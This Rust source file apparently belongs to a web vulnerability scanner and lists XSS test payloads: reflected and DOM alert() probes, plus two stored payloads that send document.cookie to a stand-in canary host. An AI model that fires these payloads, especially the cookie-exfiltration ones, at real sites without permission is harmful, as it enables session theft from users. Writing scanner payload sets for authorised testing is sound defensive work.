use crate::domain::active_vuln::{PayloadDefinition, ExpectedIndicator};
use crate::domain::entities::SeverityLevel;

pub fn get_reflected_payloads() -> Vec<PayloadDefinition> {
    vec![
        PayloadDefinition {
            id: "xss_reflected_01".into(),
            payload: "<script>alert('XSS')</script>".into(),
            description: "Basic script tag injection".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("<script>alert('XSS')</script>".into()),
            severity: SeverityLevel::High,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "xss_reflected_02".into(),
            payload: "<img src=x onerror=alert('XSS')>".into(),
            description: "Image tag with onerror event handler".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("onerror=alert".into()),
            severity: SeverityLevel::High,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "xss_reflected_03".into(),
            payload: "\"><script>alert(document.domain)</script>".into(),
            description: "Attribute breakout with script injection".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("<script>alert(document.domain)</script>".into()),
            severity: SeverityLevel::High,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "xss_reflected_04".into(),
            payload: "'-alert(1)-'".into(),
            description: "JavaScript context breakout (single-quote string)".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("'-alert(1)-'".into()),
            severity: SeverityLevel::High,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "xss_reflected_05".into(),
            payload: "<svg/onload=alert('XSS')>".into(),
            description: "SVG tag with onload event".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("onload=alert".into()),
            severity: SeverityLevel::High,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "xss_reflected_06".into(),
            payload: "javascript:alert(1)".into(),
            description: "JavaScript URI scheme injection".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("javascript:alert".into()),
            severity: SeverityLevel::High,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "xss_reflected_07".into(),
            payload: "<body onload=alert('XSS')>".into(),
            description: "Body tag with onload event".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("onload=alert".into()),
            severity: SeverityLevel::High,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "xss_reflected_08".into(),
            payload: "<details open ontoggle=alert('XSS')>".into(),
            description: "HTML5 details/ontoggle event".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("ontoggle=alert".into()),
            severity: SeverityLevel::High,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "xss_reflected_09".into(),
            payload: "{{constructor.constructor('alert(1)')()}}".into(),
            description: "Template injection / Angular sandbox escape".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("constructor.constructor".into()),
            severity: SeverityLevel::High,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "xss_reflected_10".into(),
            payload: "<iframe src=\"javascript:alert('XSS')\">".into(),
            description: "Iframe with javascript URI".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("javascript:alert".into()),
            severity: SeverityLevel::High,
            safe_for_production: true,
        },
    ]
}

pub fn get_stored_payloads() -> Vec<PayloadDefinition> {
    vec![
        PayloadDefinition {
            id: "xss_stored_01".into(),
            payload: "<script>fetch('https://limma-xss-canary.test/'+document.cookie)</script>".into(),
            description: "Cookie-stealing stored XSS canary".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("limma-xss-canary".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: false,
        },
        PayloadDefinition {
            id: "xss_stored_02".into(),
            payload: "<img src=x onerror=\"new Image().src='https://limma-xss-canary.test/?c='+document.cookie\">".into(),
            description: "Image-based cookie exfil".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("limma-xss-canary".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: false,
        },
    ]
}

pub fn get_dom_payloads() -> Vec<PayloadDefinition> {
    vec![
        PayloadDefinition {
            id: "xss_dom_01".into(),
            payload: "#<img src=x onerror=alert(1)>".into(),
            description: "Hash-based DOM XSS via innerHTML".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("onerror=alert".into()),
            severity: SeverityLevel::High,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "xss_dom_02".into(),
            payload: "?default=<script>alert(document.domain)</script>".into(),
            description: "Query parameter DOM sink injection".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("<script>alert".into()),
            severity: SeverityLevel::High,
            safe_for_production: true,
        },
    ]
}
